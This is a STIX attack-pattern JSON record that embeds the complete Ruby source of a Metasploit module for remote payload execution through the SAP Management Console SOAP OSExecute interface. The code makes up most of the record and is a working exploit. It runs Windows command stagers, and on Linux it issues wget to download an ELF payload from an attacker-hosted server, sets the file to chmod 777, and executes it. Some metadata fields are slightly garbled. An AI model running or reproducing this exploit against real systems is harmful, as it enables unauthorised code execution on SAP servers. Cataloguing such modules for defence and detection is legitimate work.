{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--23db7ceb-1228-403c-b696-c274263af885",
    "created": "2024-08-14T17:05:25.542079Z",
    "modified": "2024-08-14T17:05:25.542084Z",
    "name": "SAP Management Console OSExecute Payload Execution",
    "description": " This module executes an arbitrary payload through the SAP Management Console SOAP Interface.  A valid username and password for the SAP Management Console must be provided. This module has been tested successfully on both Windows and Linux platforms running SAP Netweaver. In order to exploit a Linux platform, the target system must have available the wget command.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/sap/sap_mgmt_con_osexec_payload.rb",
            "external_id": "sap_mgmt_con_osexec_payload.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /gSOAP\\/2.7/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SAP Management Console OSExecute Payload Execution',\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Chris John Riley', # Original module, windows target\n          'juan vazquez' # Linux target\n        ],\n      'Description'    => %q{\n          This module executes an arbitrary payload through the SAP Management Console\n        SOAP Interface.  A valid username and password for the SAP Management Console must\n        be provided. This module has been tested successfully on both Windows and Linux\n        platforms running SAP Netweaver. In order to exploit a Linux platform, the target\n        system must have available the wget command.\n      },\n      'References'     =>\n        [\n          [ 'URL', 'http://blog.c22.cc/toolsscripts/metasploit-modules/sap_mgmt_con_osexecute/' ]\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x3a\\x3b\\x3d\\x3c\\x3e\\x0a\\x0d\\x22\\x26\\x27\\x2f\\x60\\xb4\",\n        },\n      'Platform'       => %w{ linux win },\n      'Targets'        =>\n        [\n          [ 'Linux',\n            {\n              'Arch'     => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ],\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win',\n              'CmdStagerFlavor' => 'vbs'\n            },\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-03-08'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(50013),\n        OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),\n        OptString.new('USERNAME', [true, 'Username to use', '']),\n        OptString.new('PASSWORD', [true, 'Password to use', '']),\n        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the Linux payload from' ]),\n        OptString.new('DOWNFILE', [ false, 'Filename to download when using Linux target, (default: random)' ]),\n        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60])\n      ])\n    register_advanced_options(\n      [\n        OptInt.new('PAYLOAD_SPLIT', [true, 'Size of payload segments', 7500]),\n      ])\n    register_autofilter_ports([ 50013 ])\n  end\n\n  def autofilter\n    false\n  end\n\n  def check\n    begin\n      res = send_soap_request(\"\")\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Safe\n    end\n\n    if res and res.code == 200 and res.headers['Server'] =~ /gSOAP/ and res.body =~ /OSExecuteResponse/\n      return Exploit::CheckCode::Appears\n    elsif res and res.code == 500 and (res.body =~ /Invalid Credentials/ or res.body =~ /Permission denied/)\n      return Exploit::CheckCode::Detected\n    elsif res and res.headers['Server'] =~ /gSOAP/\n      return Exploit::CheckCode::Unknown\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"#{rhost}:#{rport} - Auto Detecting Remote Platform...\")\n    my_platform = auto_detect\n    if my_platform.nil?\n      print_error(\"#{rhost}:#{rport} - Remote Platform not detected, continue anyway...\")\n    elsif target['Platform'] == my_platform\n      print_good(\"#{rhost}:#{rport} - #{target.name} successfully detected...\")\n    else\n      print_error(\"#{rhost}:#{rport} - #{target.name} not detected, but #{my_platform}, continue anyway...\")\n    end\n\n    if target.name =~ /Windows/\n      print_status(\"#{rhost}:#{rport} - Connecting to SAP Management Console SOAP Interface...\")\n      linemax = datastore['PAYLOAD_SPLIT'] # Values over 9000 can cause issues\n      vprint_status(\"#{rhost}:#{rport} - Using custom payload size of #{linemax}\") if linemax != 7500\n      execute_cmdstager({ :delay => 0.35, :linemax => linemax })\n    elsif target.name =~ /Linux/\n      exploit_linux\n    end\n  end\n\n  def auto_detect\n    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'\n    xsi = 'http://www.w3.org/2001/XMLSchema-instance'\n    xs = 'http://www.w3.org/2001/XMLSchema'\n    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'\n    ns1 = 'ns1:GetEnvironment'\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"' + soapenv + '\"  xmlns:xsi=\"' + xsi\n    data << '\" xmlns:xs=\"' + xs + '\">' + \"\\r\\n\"\n    data << '<SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<sapsess:Session xlmns:sapsess=\"' + sapsess + '\">' + \"\\r\\n\"\n    data << '<enableSession>true</enableSession>' + \"\\r\\n\"\n    data << '</sapsess:Session>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '<' + ns1 + ' xmlns:ns1=\"urn:SAPControl\"></' + ns1 + '>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Envelope>' + \"\\r\\n\\r\\n\"\n\n    begin\n      res = send_request_cgi({\n        'uri'      => normalize_uri(datastore['URI']),\n        'method'   => 'POST',\n        'data'     => data,\n        'ctype'    => 'text/xml; charset=UTF-8',\n        'headers'  =>\n          {\n            'SOAPAction' => '\"\"'\n          }\n      })\n\n      if res and res.code == 200 and res.body =~ /OSTYPE=linux/\n        return \"linux\"\n      elsif res and res.code == 200 and res.body =~ /OS=Windows/\n        return \"win\"\n      else\n        return nil\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Could not access the SAP MC service\")\n    end\n\n  end\n\n  def send_soap_request(command)\n\n    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'\n    xsi = 'http://www.w3.org/2001/XMLSchema-instance'\n    xs = 'http://www.w3.org/2001/XMLSchema'\n    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'\n    ns1 = 'ns1:OSExecute'\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"' + soapenv + '\"  xmlns:xsi=\"' + xsi + '\" xmlns:xs=\"' + xs + '\">' + \"\\r\\n\"\n    data << '<SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<sapsess:Session xlmns:sapsess=\"' + sapsess + '\">' + \"\\r\\n\"\n    data << '<enableSession>true</enableSession>' + \"\\r\\n\"\n    data << '</sapsess:Session>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Body>' + \"\\r\\n\"\n    data << \"<#{ns1} xmlns:ns1=\\\"urn:SAPControl\\\"><command>#{command}</command>\"\n    data << '<async>0</async></' + ns1 + '>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Envelope>' + \"\\r\\n\\r\\n\"\n\n    res = send_request_cgi({\n      'uri'     => normalize_uri(datastore['USERNAME'], datastore['PASSWORD']),\n      'method'  => 'POST',\n      'data'    => data,\n      'ctype'   => 'text/xml; charset=UTF-8',\n      'headers' =>\n        {\n          'SOAPAction' => '\"\"'\n        }\n    })\n    return res\n  end\n\n  def exploit_linux\n    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))\n    @pl = generate_payload_exe\n    @elf_sent = false\n\n    #\n    # start our server\n    #\n    resource_uri = '/' + downfile\n\n    if (datastore['DOWNHOST'])\n      service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri\n    else\n      #do not use SSL\n      if datastore['SSL']\n        ssl_restore = true\n        datastore['SSL'] = false\n      end\n\n      #we use SRVHOST as download IP for the coming wget command.\n      #SRVHOST needs a real IP address of our download host\n      if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")\n        srv_host = Rex::Socket.source_address(rhost)\n      else\n        srv_host = datastore['SRVHOST']\n      end\n\n      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri\n      print_status(\"#{rhost}:#{rport} - Starting up our web service on #{service_url} ...\")\n      start_service({'Uri' => {\n        'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n        'Path' => resource_uri\n      }})\n\n      datastore['SSL'] = true if ssl_restore\n    end\n\n    #\n    # download payload\n    #\n    print_status(\"#{rhost}:#{rport} - Asking the SAP Management Console to download #{service_url}\")\n    #this filename is used to store the payload on the device\n    filename = rand_text_alpha_lower(8)\n\n    #not working if we send all command together -> lets take three requests\n    cmd = \"wget #{service_url} -O /tmp/#{filename}\"\n    cmd.gsub!(/ /, \"${IFS}\")\n    begin\n      res = send_soap_request(\"/bin/sh -c #{cmd}\")\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Could not access the SAP MC service\")\n    end\n    handle_response(res)\n\n    # wait for payload download\n    if (datastore['DOWNHOST'])\n      print_status(\"#{rhost}:#{rport} - Giving #{datastore['HTTP_DELAY']} seconds to the SAP Management Console to download the payload\")\n      select(nil, nil, nil, datastore['HTTP_DELAY'])\n    else\n      wait_linux_payload\n    end\n    register_file_for_cleanup(\"/tmp/#{filename}\")\n\n    #\n    # chmod\n    #\n    cmd = \"chmod 777 /tmp/#{filename}\"\n    cmd.gsub!(/ /, \"${IFS}\")\n    print_status(\"#{rhost}:#{rport} - Asking the SAP Management Console to chmod /tmp/#{filename}\")\n    begin\n      res = send_soap_request(\"/bin/sh -c #{cmd}\")\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Could not access the SAP MC service\")\n    end\n    handle_response(res)\n\n    #\n    # execute\n    #\n    cmd = \"/tmp/#{filename}\"\n    print_status(\"#{rhost}:#{rport} - Asking the SAP Management Console to execute /tmp/#{filename}\")\n    begin\n      res = send_soap_request(\"/bin/sh -c #{cmd}\")\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Could not access the SAP MC service\")\n    end\n    handle_response(res)\n  end\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    #print_status(\"on_request_uri called: #{request.inspect}\")\n    if (not @pl)\n      print_error(\"#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!\")\n      return\n    end\n    print_status(\"#{rhost}:#{rport} - Sending the payload to the server...\")\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\n\n  # wait for the data to be sent\n  def wait_linux_payload\n    print_status(\"#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...\")\n\n    waited = 0\n    while (not @elf_sent)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > datastore['HTTP_DELAY'])\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?\")\n      end\n    end\n  end\n\n  # This is method required for the Windows CmdStager to work\n  def execute_command(cmd, opts)\n\n    cmd_s = cmd.split(\"&\") #Correct issue with multiple commands on a single line\n    if cmd_s.length > 1\n      vprint_status(\"#{rhost}:#{rport} - Command Stager progress -  Split final payload for delivery (#{cmd_s.length} sections)\")\n    end\n\n    cmd_s = cmd_s.collect(&:strip)\n    cmd_s.each do |payload|\n      begin\n        res = send_soap_request(\"cmd /c #{payload.strip}\")\n      rescue ::Rex::ConnectionError\n        fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Could not access SAP service\")\n      end\n      handle_response(res)\n    end\n  end\n\n  def handle_response(res)\n    if (res and res.code != 500 and res.code != 200)\n      fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - Invalid server response\")\n    elsif res and res.code == 500\n      body = res.body\n      if body.match(/Invalid Credentials/i)\n        print_error(\"#{rhost}:#{rport} - The Supplied credentials are incorrect\")\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - Exploit not complete, check credentials\")\n      elsif body.match(/Permission denied/i)\n        print_error(\"#{rhost}:#{rport} - The Supplied credentials are valid, but lack OSExecute permissions\")\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - Exploit not complete, check credentials\")\n      end\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Exploit not complete, OSExecute isn't working\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2011-03-08",
    "x_mitre_platforms": [
        "win'"
    ]
}